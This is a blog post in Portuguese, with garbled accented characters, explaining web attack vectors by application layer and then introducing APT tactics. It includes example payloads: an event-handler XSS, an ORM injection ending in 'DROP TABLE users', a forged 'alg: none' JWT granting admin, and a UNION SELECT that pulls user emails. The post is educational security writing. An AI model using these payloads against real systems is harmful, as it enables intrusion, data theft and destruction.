<!DOCTYPE html>
<html lang="en-gb"><head><meta charset="utf-8">
<meta http-equiv="content-type" content="text/html">
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<title itemprop="name">An√°lise de Vetores de Ataque em Aplica√ß√µes Web  | Obtuosa</title>
<meta property="og:title" content="An√°lise de Vetores de Ataque em Aplica√ß√µes Web  | Obtuosa" />
<meta name="twitter:title" content="An√°lise de Vetores de Ataque em Aplica√ß√µes Web  | Obtuosa" />
<meta itemprop="name" content="An√°lise de Vetores de Ataque em Aplica√ß√µes Web  | Obtuosa" />
<meta name="application-name" content="An√°lise de Vetores de Ataque em Aplica√ß√µes Web  | Obtuosa" />
<meta property="og:site_name" content="Obtuosa" />

<meta name="description" content="Uma an√°lise de vetores de Ataque em arquitetura de aplica√ß√µes web">
<meta itemprop="description" content="Uma an√°lise de vetores de Ataque em arquitetura de aplica√ß√µes web" />
<meta property="og:description" content="Uma an√°lise de vetores de Ataque em arquitetura de aplica√ß√µes web" />
<meta name="twitter:description" content="Uma an√°lise de vetores de Ataque em arquitetura de aplica√ß√µes web" />

<meta property="og:locale" content="en-gb" />
<meta name="language" content="en-gb" />

  <link rel="alternate" hreflang="en-gb" href="https://obtuosa.github.io/posts/arquitetura/" title="English" />


<meta itemprop="image" content="https://obtuosa.github.io/images/www.png" />
<meta property="og:image" content="https://obtuosa.github.io/images/www.png" />
<meta name="twitter:image" content="https://obtuosa.github.io/images/www.png" />
<meta name="twitter:image:src" content="https://obtuosa.github.io/images/www.png" />


    
    
    

    <meta property="og:type" content="article" />
    <meta property="og:article:published_time" content=2025-11-21T00:00:00Z />
    <meta property="article:published_time" content=2025-11-21T00:00:00Z />
    <meta property="og:url" content="https://obtuosa.github.io/posts/arquitetura/" />

    
    <meta property="og:article:author" content="" />
    <meta property="article:author" content="" />
    <meta name="author" content="" />
    
    

    

    <script defer type="application/ld+json">
    {
        "@context": "http://schema.org",
        "@type": "Article",
        "headline": "An√°lise de Vetores de Ataque em Aplica√ß√µes Web ",
        "author": {
        "@type": "Person",
        "name": ""
        },
        "datePublished": "2025-11-21",
        "description": "Uma an√°lise de vetores de Ataque em arquitetura de aplica√ß√µes web",
        "wordCount":  3732 ,
        "mainEntityOfPage": "True",
        "dateModified": "2025-11-21",
        "image": {
        "@type": "imageObject",
        "url": "https:\/\/obtuosa.github.io\/images\/www.png"
        },
        "publisher": {
        "@type": "Organization",
        "name": "Obtuosa"
        }
    }
    </script>


<meta name="generator" content="Hugo 0.131.0">

    
    <meta property="og:url" content="https://obtuosa.github.io/posts/arquitetura/">
  <meta property="og:site_name" content="Obtuosa">
  <meta property="og:title" content="An√°lise de Vetores de Ataque em Aplica√ß√µes Web ">
  <meta property="og:description" content="Uma an√°lise de vetores de Ataque em arquitetura de aplica√ß√µes web">
  <meta property="og:locale" content="en_gb">
  <meta property="og:type" content="article">
    <meta property="article:section" content="posts">
    <meta property="article:published_time" content="2025-11-21T00:00:00+00:00">
    <meta property="article:modified_time" content="2025-11-21T00:00:00+00:00">
    <meta property="article:tag" content="Owasp">
    <meta property="article:tag" content="Mitre">
    <meta property="article:tag" content="Web">


    
    
  <meta name="twitter:card" content="summary">
  <meta name="twitter:title" content="An√°lise de Vetores de Ataque em Aplica√ß√µes Web ">
  <meta name="twitter:description" content="Uma an√°lise de vetores de Ataque em arquitetura de aplica√ß√µes web">

    

    

    <link rel="canonical" href="https://obtuosa.github.io/posts/arquitetura/">
    <link href="/style.min.2d921c18cf1ec555ffc03d59a8adc211c402c68c930c27d6a0c306ab175a8d09.css" rel="stylesheet">
    <link href="/code-highlight.min.706d31975fec544a864cb7f0d847a73ea55ca1df91bf495fd12a177138d807cf.css" rel="stylesheet">

    
    <link rel="apple-touch-icon" sizes="180x180" href="/icons/apple-touch-icon.png">
    <link rel="icon" type="image/png" sizes="32x32" href="/icons/favicon-32x32.png">
    <link rel="icon" type="image/png" sizes="16x16" href="/icons/favicon-16x16.png">
    <link rel="mask-icon" href="/icons/safari-pinned-tab.svg">
    <link rel="shortcut icon" href="/favicon.ico">




<link rel="manifest" href="https://obtuosa.github.io/site.webmanifest">

<meta name="msapplication-config" content="/browserconfig.xml">
<meta name="msapplication-TileColor" content="#2d89ef">
<meta name="theme-color" content="#434648">

    
    <link rel="icon" type="image/svg+xml" href="/icons/favicon.svg">

    
    
  


    

</head>
<body data-theme = "dark" class="notransition">

<script src="/js/theme.min.8961c317c5b88b953fe27525839672c9343f1058ab044696ca225656c8ba2ab0.js" integrity="sha256-iWHDF8W4i5U/4nUlg5ZyyTQ/EFirBEaWyiJWVsi6KrA="></script>

<div class="navbar" role="navigation">
    <nav class="menu" aria-label="Main Navigation">
        <a href="https://obtuosa.github.io/" class="logo">
            <svg xmlns="http://www.w3.org/2000/svg" width="25" height="25" 
viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" 
stroke-linejoin="round" class="feather feather-home">
<title>Home</title>
<path d="M3 9l9-7 9 7v11a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2z"></path>
<polyline points="9 22 9 12 15 12 15 22"></polyline>
</svg>
        </a>
        <input type="checkbox" id="menu-trigger" class="menu-trigger" />
        <label for="menu-trigger">
            <span class="menu-icon">
                <svg xmlns="http://www.w3.org/2000/svg" width="25" height="25" stroke="currentColor" fill="none" viewBox="0 0 14 14"><title>Menu</title><path stroke-linecap="round" stroke-linejoin="round" d="M10.595 7L3.40726 7"></path><path stroke-linecap="round" stroke-linejoin="round" d="M10.5096 3.51488L3.49301 3.51488"></path><path stroke-linecap="round" stroke-linejoin="round" d="M10.5096 10.4851H3.49301"></path><path stroke-linecap="round" stroke-linejoin="round" d="M0.5 12.5V1.5C0.5 0.947715 0.947715 0.5 1.5 0.5H12.5C13.0523 0.5 13.5 0.947715 13.5 1.5V12.5C13.5 13.0523 13.0523 13.5 12.5 13.5H1.5C0.947715 13.5 0.5 13.0523 0.5 12.5Z"></path></svg>
            </span>
        </label>
    
        <div class="trigger">
            <ul class="trigger-container">
                
                
                <li>
                    <a class="menu-link " href="/">
                        In√≠cio
                    </a>
                    
                </li>
                
                <li>
                    <a class="menu-link active" href="/posts/">
                        Posts
                    </a>
                    
                </li>
                
                <li>
                    <a class="menu-link " href="/pages/about/">
                        Whoami
                    </a>
                    
                </li>
                
                <li class="menu-separator">
                    <span>|</span>
                </li>
                
                
            </ul>
            <a id="mode" href="#">
                <svg xmlns="http://www.w3.org/2000/svg" class="mode-sunny" width="21" height="21" viewBox="0 0 14 14" stroke-width="1">
<title>LIGHT</title><g><circle cx="7" cy="7" r="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></circle><line x1="7" y1="0.5" x2="7" y2="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="2.4" x2="3.82" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="0.5" y1="7" x2="2.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="11.6" x2="3.82" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="7" y1="13.5" x2="7" y2="11.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="11.6" x2="10.18" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="13.5" y1="7" x2="11.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="2.4" x2="10.18" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line></g></svg>
                <svg xmlns="http://www.w3.org/2000/svg" class="mode-moon" width="21" height="21" viewBox="0 0 14 14" stroke-width="1">
<title>DARK</title><g><circle cx="7" cy="7" r="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></circle><line x1="7" y1="0.5" x2="7" y2="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="2.4" x2="3.82" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="0.5" y1="7" x2="2.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="11.6" x2="3.82" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="7" y1="13.5" x2="7" y2="11.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="11.6" x2="10.18" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="13.5" y1="7" x2="11.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="2.4" x2="10.18" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line></g></svg>
            </a>
        </div>
    </nav>
</div>

<div class="wrapper post">
    <main class="page-content" aria-label="Content">
        <article>
            <header class="header">
                <h1 class="header-title">An√°lise de Vetores de Ataque em Aplica√ß√µes Web </h1>
                
                
                
                <div class="post-meta">
                    <time datetime="2025-11-21T00:00:00&#43;00:00" itemprop="datePublished"> 21 Nov 2025 </time>
                </div>
                
            </header>
            
            <div class="page-content">
                <p><img alt="WWW" src="https://dev-to-uploads.s3.amazonaws.com/uploads/articles/89c92vzuxd4jon4dfn0z.png"></p>
<h2 id="resumo">Resumo</h2>
<p>Este texto tem como proposta uma an√°lise  aprofundada sobre a seguran√ßa de aplica√ß√µes web, mas de uma perspectiva ofensiva. Atrav√©s da <strong>arquitetura de tr√™s camadas</strong> (Apresenta√ß√£o, Aplica√ß√£o e Dados), comumente conhecido como <strong>Three Tier Architecture</strong>, detalhando vetores de ataques espec√≠ficos para cada camada com exemplos de c√≥digo pr√°ticos. Al√©m disso, tamb√©m fornecer uma investiga√ß√£o de t√°ticas, t√©cnicas e procedimentos (TTPs) de grupos de Amea√ßa Persistente Avan√ßada (APT), como o <strong>APT35</strong>, esmiu√ßando tecnicamente um de seus ataques com exemplos de payloads e comandos. O texto tamb√©m explora a import√¢ncia da an√°lise a partir do OWASP Top 10 que lista os dez riscos de seguran√ßa mais cr√≠ticos e comuns em aplica√ß√µes web. O objetivo √© permitir uma vis√£o t√©cnica e estruturada, para aspirantes, entusiastas, profissionais e pesquisadores da √°rea de seguran√ßa da informa√ß√£o interessados em vulnerabilidades em aplica√ß√µes web e em um ciclo de ataque de um APT.</p>
<h2 id="1-introdu√ß√£o">1. Introdu√ß√£o</h2>
<p>A grande crescente de depend√™ncia de aplica√ß√µes web para servi√ßos cr√≠ticos, tendo em vista que hoje tudo pode ser feito atrav√©s do navegador tornou a seguran√ßa dessas aplica√ß√µes um pilar fundamental da ciberseguran√ßa. Atacantes, desde indiv√≠duos at√© mesmo grupos de Amea√ßa Persistente Avan√ßada (APT), <strong>patrocinados muitas vezes por estados</strong>, exploram vulnerabilidades em aplica√ß√µes web para roubo de dados, espionagem, sabotagem, etc. <strong>Compreender a estrutura das aplica√ß√µes web e como os(as) atacantes a manipulam √© indispens√°vel para a constru√ß√£o de defesas s√≥lidas</strong>.</p>
<p>Este texto tenta aplicar uma vis√£o ofensiva para dissecar a seguran√ßa de aplica√ß√µes web. Deste modo, inicia-se com a an√°lise da arquitetura de tr√™s camadas, um modelo predominante no mercado, e como cada camada pode apresentar uma superf√≠cie de ataque √∫nica, com exemplos de c√≥digo que ilustram os ataques. A refer√™ncia dessa an√°lise √© o OWASP Top 10 e a partir dele, construir uma ponte entre as vulnerabilidades em uma vis√£o te√≥rica e os ataques do mundo real, examinando estudos de caso de grupos APT.</p>
<h2 id="2-arquitetura-de-tr√™s-camadas-e-vetores-de-ataque">2. Arquitetura de Tr√™s Camadas e Vetores de Ataque</h2>
<p><img alt="Tr√™s camadas" src="https://dev-to-uploads.s3.amazonaws.com/uploads/articles/k3t3tq18ukef0ohirrq3.png"></p>
<p>A arquitetura de tr√™s camadas √© predominante para aplica√ß√µes tradicionais de cliente-servidor e √© dividida em tr√™s unidades l√≥gicas: a camada de apresenta√ß√£o, camada de aplica√ß√£o e camada de dados. Essa separa√ß√£o cria diferentes dom√≠nios de seguran√ßa.</p>
<h3 id="21-camada-de-apresenta√ß√£o-presentation-layer">2.1. Camada de Apresenta√ß√£o (Presentation Layer)</h3>
<p>√â a interface com o usu√°rio no navegador, al√©m de ser a camada de comunica√ß√£o da aplica√ß√£o no qual o usu√°rio final interage. A princ√≠pio, seu objetivo √© de exibir e coletar informa√ß√µes do usu√°rio. Do ponto de vista de um invasor, esta camada √© um alvo principal para ataques que  focam o usu√°rio.</p>
<h3 id="211-cross-site-scripting">2.1.1. Cross-Site Scripting</h3>
<p>Cross-Site Scripting (XSS) √© uma falha no sistema que possibilita o/a atacante injetar c√≥digos maliciosos em p√°ginas web. O OWASP classifica o XSS como uma forma de Inje√ß√£o (A05:2025) e dialoga tamb√©m com Configura√ß√£o incorreta de seguran√ßa (A02:2025).</p>
<p>Hodiernamente, WAFs (Firewalls de Aplica√ß√µes Web) e frameworks modernos (React, Angular, Django, etc.) j√° possuem mecanismos que bloqueiam XSS tradicionais (como o cl√°ssico <code>&lt;script&gt;alert(1)&lt;/script&gt;</code>). Logo, os ataques tamb√©m mudaram de lugar, muitos agora exploram contextos espec√≠ficos, valida√ß√£o incompleta de entrada e renderiza√ß√£o din√¢mica no cliente (DOM XSS).</p>
<p>Imagine uma rede social onde os usu√°rios podem editar a sua biografia, algo bastante comum em diversos ambientes online, como o X/Twitter, Facebook e Instagram. Neste ponto, √© poss√≠vel inserir um texto formatado, seja em negrito, com links, emojis, etc.</p>
<p>A partir dessa contextualiza√ß√£o, em um cen√°rio de rede social que usa um editor de texto, por exemplo, e salva o conte√∫do HTML diretamente no banco de dados, quando esse perfil √© renderizado, o HTML vem direto da base e √© inserido na p√°gina, com algo assim:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">&lt;div <span class="nv">class</span><span class="o">=</span><span class="s2">&#34;bio&#34;</span>&gt;
</span></span><span class="line"><span class="cl">  &lt;p&gt;Ol√°, me chamo Pedroca e quero fazer novas amizadesüòé&lt;/p&gt;
</span></span><span class="line"><span class="cl">&lt;/div&gt;
</span></span></code></pre></div><p>S√≥ que nesse processo de inspecionar o HTML e observar como o sistema lida com esse conte√∫do ap√≥s recebe-lo, principalmente sobre como o valor do campo √© armazenado e renderizado depois no site,  o/a atacante percebe que o campo aceita algumas tags HTML. Ele/Ela tenta inserir um conte√∫do aparentemente inofensivo, mas com comportamento malicioso.</p>
<p>O/A invasor(a) insere na biografia:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">&lt;p&gt;Ol√°, me chamo Pedroca e quero fazer novas amizadesüòé&lt;/p&gt;
</span></span><span class="line"><span class="cl">&lt;img <span class="nv">src</span><span class="o">=</span><span class="s2">&#34;https://pedrocanews.com/imagem.png&#34;</span> <span class="nv">onmouseover</span><span class="o">=</span><span class="s2">&#34;alert(&#39;XSS by Pedroca&#39;)&#34;</span> /&gt;
</span></span></code></pre></div><p>E nesse contexto, nem sempre as WAFs conseguem ser acionadas, porque n√£o usa a tag <code>&lt;script&gt;</code> diretamente, al√©m de parecer leg√≠timo, porque <img> √© uma tag comum e a execu√ß√£o acaba dependendo de um evento do DOM (Modelo de Objeto de Documento) e quando outro usu√°rio passa o mouse sobre a imagem, o Javascript √© executado, com isso ocorre uma execu√ß√£o arbitr√°ria dentro do dom√≠nio do site.</p>
<h3 id="22-camada-de-aplica√ß√£o">2.2. Camada de Aplica√ß√£o</h3>
<p>A camada de aplica√ß√£o √© basicamente a parte central, pois processa a l√≥gica de neg√≥cios. √â talvez o alvo mais almejado e rico para intrusos(as) que buscam comprometer a funcionalidade principal, al√©m de tamb√©m incluir, excluir ou modificar informa√ß√µes da camada de dados.</p>
<h3 id="221-inje√ß√£o-de-sql-sqli">2.2.1. Inje√ß√£o de SQL (SQLi)</h3>
<p>A inje√ß√£o de SQL ocorre quando um advers√°rio insere uma consulta SQL maliciosa. √â uma das vulnerabilidades mais perigosas, categorizada como Quebra de controle de acesso (A01:2025),  Configura√ß√£o incorreta de seguran√ßa (A02:2025) e Inje√ß√£o (A05:2025) pelo OWASP, no entanto, muitas aplica√ß√µes n√£o montam mais queries SQL ‚Äúna m√£o‚Äù. Hoje, usam <strong>ORMS</strong> (Object-Relational Mappers) que criam uma ponte entre o banco de dados e uma aplica√ß√£o orientada a objetos. Por consequ√™ncia, o SQLi n√£o √© mais s√≥ concatenar string, porque por padr√£o, usam consultas parametrizadas (prepared statements), que separam os dados da l√≥gica da consulta, tornando a inje√ß√£o mais ‚Äútradicional‚Äù quase imposs√≠vel.</p>
<p>Em um cen√°rio pr√°tico, onde supostamente uma API de busca est√° vulner√°vel, a mesma aceita par√¢metros de entrada do usu√°rio e os passa diretamente para um ORM sem qualquer valida√ß√£o adequada permitindo que os invasores manipulem consultas ao banco de dados. Portanto, ocorre uma inje√ß√£o via ORM.</p>
<p>O Back end exp√µe o endpoint:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">GET /api/users?sort_by<span class="o">=</span>name<span class="p">&amp;</span><span class="nv">order</span><span class="o">=</span>asc
</span></span></code></pre></div><p>O desenvolvedor escreve o c√≥digo, que est√° em Node.js com Sequelize:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">const <span class="nv">sortBy</span> <span class="o">=</span> req.query.sort_by<span class="p">;</span> 
</span></span><span class="line"><span class="cl">const <span class="nv">order</span> <span class="o">=</span> req.query.order<span class="p">;</span>   
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">User.findAll<span class="o">({</span>
</span></span><span class="line"><span class="cl">  order: <span class="o">[[</span>sortBy, order<span class="o">]]</span>
</span></span><span class="line"><span class="cl"><span class="o">})</span><span class="p">;</span>
</span></span></code></pre></div><p>Em uma primeira an√°lise, aparenta ser seguro, tendo em vista que o ORM ‚Äúescapa‚Äù par√¢metros. mas o problema √© que n√£o escapa identificadores (colunas), e como o <code>sortBy</code> vai direto para query, o intruso controla parte da estrutura SQL e ent√£o o atacante envia:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">GET /api/users?sort_by<span class="o">=</span>name<span class="o">)</span><span class="p">;</span>DROP TABLE users<span class="p">;</span>--
</span></span></code></pre></div><p>A query interna se transforma em algo parecido com:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">SELECT * FROM users ORDER BY name<span class="o">)</span><span class="p">;</span>DROP TABLE users<span class="p">;</span>--
</span></span></code></pre></div><p>Ou seja, se o ORM n√£o sanitiza adequadamente os nomes de coluna, essa instru√ß√£o extra pode ser interpretada, e mesmo com WAFs, esse tipo de ataque pode acabar passando, pois o payload n√£o cont√©m palavras-chave simples como <code>‚Äò OR 1=1;</code> , al√©m de ser poss√≠vel tamb√©m ofuscar essas requisi√ß√µes.</p>
<h3 id="222-quebra-de-autentica√ß√£o">2.2.2. Quebra de Autentica√ß√£o</h3>
<p>Quebra de autentica√ß√£o s√£o falhas que permitem a atacantes comprometerem contas de usu√°rios e interage com Quebra de controle de acesso (A01:2025), Configura√ß√£o incorreta de seguran√ßa (A02:2025) e Falhas de autentica√ß√£o (A07:2025) do OWASP Top 10.</p>
<p>Outro ponto importante √© que se utiliza muito os tokens para autentica√ß√£o via API, no lugar de cookies e sess√µes, como por exemplo o <strong>JWT</strong> (JSON Web Token) e apesar do uso de tokens, algumas novas formas de falhas surgiram em virtude do mau uso deles.</p>
<p>Imagine uma aplica√ß√£o que gera tokens JWT mal configurados:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">const <span class="nv">jwt</span> <span class="o">=</span> require<span class="o">(</span><span class="s1">&#39;jsonwebtoken&#39;</span><span class="o">)</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">const <span class="nv">token</span> <span class="o">=</span> jwt.sign<span class="o">({</span> user: username, role: <span class="s1">&#39;user&#39;</span> <span class="o">}</span>, <span class="s1">&#39;chave-secreta&#39;</span><span class="o">)</span><span class="p">;</span>
</span></span></code></pre></div><p>e valida dessa forma:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">jwt.verify<span class="o">(</span>token, <span class="s1">&#39;chave-secreta&#39;</span><span class="o">)</span><span class="p">;</span>
</span></span></code></pre></div><p>Neste ponto, o Back end acaba aceitando tokens sem checar o algoritmo usado e em uma explora√ß√£o, onde um invasor cria um token com o algoritmo ‚Äúnone‚Äù, acaba for√ßando o servidor a n√£o verificar assinatura:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="o">{</span>
</span></span><span class="line"><span class="cl">  <span class="s2">&#34;alg&#34;</span>: <span class="s2">&#34;none&#34;</span>,
</span></span><span class="line"><span class="cl">  <span class="s2">&#34;typ&#34;</span>: <span class="s2">&#34;JWT&#34;</span>
</span></span><span class="line"><span class="cl"><span class="o">}</span>
</span></span></code></pre></div><p>Payload:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="o">{</span>
</span></span><span class="line"><span class="cl">  <span class="s2">&#34;user&#34;</span>: <span class="s2">&#34;pedroca&#34;</span>,
</span></span><span class="line"><span class="cl">  <span class="s2">&#34;role&#34;</span>: <span class="s2">&#34;admin&#34;</span>
</span></span><span class="line"><span class="cl"><span class="o">}</span>
</span></span></code></pre></div><p>Como resultado, o back end confia no token mascarado, concedendo acesso administrativo. Apesar da falha ‚Äúalg: none‚Äù ser antiga, alguns sistemas ainda s√£o vulner√°veis, principalmente por usar servi√ßos intermedi√°rios (API Gateways, proxies) que s√≥ verificam formato e n√£o a assinatura.</p>
<h3 id="23-camada-de-dados-data-layer">2.3. Camada de Dados (Data Layer)</h3>
<p>A camada de dados √© a camada na qual as informa√ß√µes processadas pela aplica√ß√£o s√£o armazenadas e gerenciadas.  A aplica√ß√£o basicamente persiste, busca e processa as informa√ß√µes c≈ïiticas. Quando por exemplo, a camada de aplica√ß√£o √© vulner√°vel a Inje√ß√£o SQL, um atacante pode acabar usando dessa falha para exfiltrar dados diretamente do banco.</p>
<h3 id="231-exfiltra√ß√£o-de-dados-via-sqli">2.3.1 Exfiltra√ß√£o de Dados via SQLi</h3>
<p>Exfiltra√ß√£o de dados via SQLi  √© quando um atacante pode usar da vulnerabilidade de inje√ß√£o SQL para retirar dados diretamente do banco de dados. Pode ser categorizada nas mesmas din√¢micas da Inje√ß√£o de SQL quanto ao OWASP, j√° que nasce a partir dela.</p>
<p>Em uma aplica√ß√£o de e-commerce com um determinado endpoint de busca:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">GET /api/products?category<span class="o">=</span>iphone
</span></span></code></pre></div><p>O back end executa uma query dessa forma:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="k">SELECT</span><span class="w"> </span><span class="n">name</span><span class="p">,</span><span class="w"> </span><span class="n">price</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">products</span><span class="w"> </span><span class="k">WHERE</span><span class="w"> </span><span class="n">category</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;iphone&#39;</span><span class="p">;</span><span class="w">
</span></span></span></code></pre></div><p>A pessoa que est√° desenvolvendo confia plenamente no par√¢metro <code>category</code> e apenas insere ele na query, mas um atacante consegue perceber isso e come√ßa a explorar, ainda que tenha que passar pelos WAFs e logs que filtram strings simples como <code>‚Äò OR 1=1</code>  ou <code>UNION SELECT</code> .</p>
<p>O atacante insere a cl√°ssica aspas simples:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="o">/</span><span class="n">api</span><span class="o">/</span><span class="n">products</span><span class="o">?</span><span class="n">category</span><span class="o">=</span><span class="n">iphone</span><span class="s1">&#39;
</span></span></span></code></pre></div><p>O back end acaba retornando erro de SQL e cria brechas para a explora√ß√£o. Uma das diversas t√©cnicas √© a inje√ß√£o UNION-Based.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="s1">&#39; UNION SELECT username, email FROM users--
</span></span></span></code></pre></div><p>Essa query faz com que o sistema combine os resultados da tabela users com os da tabela products. O servidor caso seja poss√≠vel burlar as camadas de seguran√ßa retorna algo como:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="p">[</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="err">{</span><span class="s2">&#34;name&#34;</span><span class="p">:</span><span class="w"> </span><span class="s2">&#34;pedroca&#34;</span><span class="p">,</span><span class="w"> </span><span class="s2">&#34;price&#34;</span><span class="p">:</span><span class="w"> </span><span class="s2">&#34;pedroca@example.com&#34;</span><span class="err">}</span><span class="p">,</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="err">{</span><span class="s2">&#34;name&#34;</span><span class="p">:</span><span class="w"> </span><span class="s2">&#34;admin&#34;</span><span class="p">,</span><span class="w"> </span><span class="s2">&#34;price&#34;</span><span class="p">:</span><span class="w"> </span><span class="s2">&#34;admin@example.com&#34;</span><span class="err">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">]</span><span class="w">
</span></span></span></code></pre></div><p>Esse tipo de ataque funciona porque o banco de dados acaba sendo compartilhado entre diferentes √°reas da aplica√ß√£o, e a query √© montada de forma concatenada, sem uso de par√¢metros. Hoje WAFs detectam <code>UNION SELECT</code> literal, ent√£o os invasores tentam disfar√ßar a consulta de alguma forma, seja com encoding, coment√°rios in-line, etc.</p>
<h2 id="3-amea√ßas-persistente-avan√ßadas-apts">3. Amea√ßas Persistente Avan√ßadas (APTs)</h2>
<p>Uma <strong>Amea√ßa Persistente Avan√ßada (APT)</strong> √© um tipo de ataque cibern√©tico mais sofisticado e longo, no qual um agente de amea√ßa, geralmente um <strong>estado-na√ß√£o</strong> ou um grupo que seja patrocinado por ele, realiza ataques que obt√©m acesso n√£o autorizado, sendo as aplica√ß√µes web vetores de entrada bastante comuns e permanecem indetectado por um longo per√≠odo. O objetivo principal dessas a√ß√µes, √© justamente roubo de dados sens√≠veis, espionagem, sabotagem de sistemas, etc.</p>
<p>O termo ‚ÄúAPT‚Äù √© definido atrav√©s de tr√™s caracter√≠sticas fundamentais:</p>
<ol>
<li><strong>Avan√ßada (Advanced)</strong>: Os invasores utilizam de um leque completo de ferramentas e t√©cnicas, que podem incluir desde explora√ß√£o de vulnerabilidades <strong>zero day</strong>, <strong>engenharia social</strong> muito bem direcionada ****e <strong>malwares</strong> bem objetivos.</li>
<li><strong>Persistente (Persistent)</strong>: Neste ponto o invasor consegue manter um <strong>canal de comando e controle</strong> (Command and Control - C2) cont√≠nuo com um dos ou o sistema comprometido, garantindo o acesso, mesmo depois de uma poss√≠vel detec√ß√£o e remo√ß√£o, por exemplo de um malware. √â poss√≠vel tamb√©m muitas vezes, a depender do escopo dos objetivos tra√ßados, que acabe retornando novamente ao sistema.</li>
<li><strong>Amea√ßa (Threat)</strong>: Esse ataque √© orquestrado por grupos de agente de amea√ßa, organizado e motivado, com recursos significativos e objetivos muito bem definidos, como governos, grandes corpora√ß√µes ou infraestruturas cr√≠ticas.</li>
</ol>
<h3 id="31-grupos-de-apt-e-suas-t√°ticas">3.1. Grupos de APT e suas t√°ticas</h3>
<p>Os Grupos de APT s√£o categorizados por ag√™ncias de intelig√™ncia e empresas de seguran√ßa cibern√©tica, muitas vezes recebem nomes a partir de taxonomia e identificadores alfanum√©ricos, como no caso do framework <strong>MITRE ATT&amp;CK</strong>, que √© uma refer√™ncia essencial para compreender as t√°ticas e t√©cnicas usadas por esses grupos.</p>
<h3 id="311-t√°ticas-t√©cnicas-e-procedimentos-ttps-de-apts">3.1.1 T√°ticas, T√©cnicas e Procedimentos (TTPs) de APTs</h3>
<p>As <strong>T√°ticas, T√©cnicas e Procedimentos (TTPs)</strong> representam ****a forma de agir de um APT, detalhando desde o ‚Äúpor qu√™‚Äù, ‚Äúcomo‚Äù e o ‚Äúo qu√™‚Äù de suas a√ß√µes O ciclo de vida de um ataque APT √© normalmente dividido em fases, e o framework <strong>MITRE ATT&amp;CK</strong> fornece a taxonomia mais aceita atualmente para descrever as TTPs em cada fase.</p>
<h3 id="312-o-ciclo-de-vida-do-ataque-e-o-mitre-attck">3.1.2. O Ciclo de Vida do Ataque e o MITRE ATT&amp;CK</h3>
<p>O ciclo de vida de um ataque APT √© um processo multifacetado e cont√≠nuo, que se relaciona diretamente com as <strong>T√°ticas</strong> do MITRE ATT&amp;CK. As t√°ticas representam o objetivo t√°tico do advers√°rio/a em cada est√°gio do ataque.</p>
<p><img alt="Matriz" src="https://dev-to-uploads.s3.amazonaws.com/uploads/articles/77smrisay8zm1fhfztah.png"></p>
<ol>
<li><strong>Reconhecimento - Reconnaissance (TA0043)</strong>: O invasor re√∫ne informa√ß√µes que podem ser usadas para planejar opera√ß√µes futuras, coletando ativa ou passivamente informa√ß√µes que podem ser usadas para apoiar a defini√ß√£o de alvos.</li>
